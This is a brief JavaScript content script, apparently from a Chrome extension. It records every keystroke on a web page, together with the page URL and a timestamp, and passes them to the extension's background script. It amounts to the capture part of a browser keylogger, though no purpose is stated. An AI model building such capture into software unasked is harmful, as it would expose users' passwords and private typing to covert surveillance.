document.addEventListener('keydown', function(event){
    if (event.isComposing || event.keyCode === 229) return;

    chrome.runtime.sendMessage({
        type: 'keystroke',
        key: event.key,
        code: event.code,
        url: window.location.href,
        timestamp: Date.now()
    });
});